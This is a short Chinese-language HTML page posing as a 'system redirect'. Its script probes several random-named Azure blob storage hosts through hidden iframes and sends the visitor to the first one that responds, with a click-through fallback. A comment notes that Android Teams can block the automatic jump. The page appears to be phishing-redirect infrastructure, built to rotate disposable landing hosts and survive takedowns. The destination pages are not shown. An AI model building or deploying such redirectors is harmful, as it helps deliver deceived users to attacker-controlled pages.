<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>系统跳转中...</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      background-color: #f4f7fb;
      color: #333;
      font-family: "Segoe UI", Roboto, sans-serif;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      text-align: center;
    }
    #message {
      font-size: 18px;
      margin-top: 20px;
      opacity: 0;
      animation: fadeIn 0.8s ease-in-out forwards;
    }
    button {
      padding: 10px 24px;
      font-size: 16px;
      border: none;
      border-radius: 8px;
      background-color: #0078d4;
      color: white;
      cursor: pointer;
      margin-top: 24px;
      display: none;
    }
    .icon {
      width: 80px;
      height: 80px;
      opacity: 0.7;
    }
    @keyframes fadeIn {
      to { opacity: 1; }
    }
  </style>
</head>
<body>

  <svg class="icon" viewBox="0 0 24 24" fill="none" id="icon">
    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10
             10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"
          fill="#0078d4"/>
  </svg>
  <div id="message">正在进入系统，请稍候...</div>
  <button id="retryBtn" onclick="manualJump()">点击进入系统</button>

  <script>
    const urls = [
      "https://iwtq25dhr.blob.core.windows.net/home/index.html",
      "https://fx4iug5qsp.blob.core.windows.net/home/index.html",
      "https://hjdkc8731miw.blob.core.windows.net/home/index.html",
      "https://x93yv2cak5w8.z48.web.core.windows.net/home/index.html"
    ];

    const timeout = 4000;
    let validUrl = null;

    function tryUrl(url, onSuccess, onFailure) {
      const iframe = document.createElement("iframe");
      iframe.style.display = "none";
      iframe.src = url;
      document.body.appendChild(iframe);

      const timer = setTimeout(() => {
        document.body.removeChild(iframe);
        onFailure();
      }, timeout);

      iframe.onload = () => {
        clearTimeout(timer);
        document.body.removeChild(iframe);
        onSuccess(url);
      };
    }

    function tryNext(index) {
      if (index >= urls.length) {
        showFailUI();
        return;
      }

      tryUrl(
        urls[index],
        (url) => {
          validUrl = url;
          autoJump(url);
        },
        () => {
          tryNext(index + 1);
        }
      );
    }

    function autoJump(url) {
      try {
        // 有些安卓 Teams 会拦截自动跳转，需要 fallback
        window.location.href = url;

        // 2秒后检查是否跳转成功，如果没跳就提示用户点击
        setTimeout(() => {
          if (!document.hidden) {
            // 页面还在 → 跳转失败
            showManualJumpUI();
          }
        }, 2000);
      } catch {
        showManualJumpUI();
      }
    }

    function showManualJumpUI() {
      document.getElementById("message").innerText = "请点击按钮进入系统";
      document.getElementById("retryBtn").style.display = "inline-block";
    }

    function showFailUI() {
      document.getElementById("icon").innerHTML = `
        <path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z" fill="#D13438"/>`;
      document.getElementById("message").innerText = "系统维护中，请稍后再试。";
    }

    function manualJump() {
      if (validUrl) {
        window.location.href = validUrl;
      } else {
        document.getElementById("message").innerText = "未找到可用地址，请刷新页面。";
      }
    }

    window.onload = () => {
      tryNext(0);
    };
  </script>

</body>
</html>
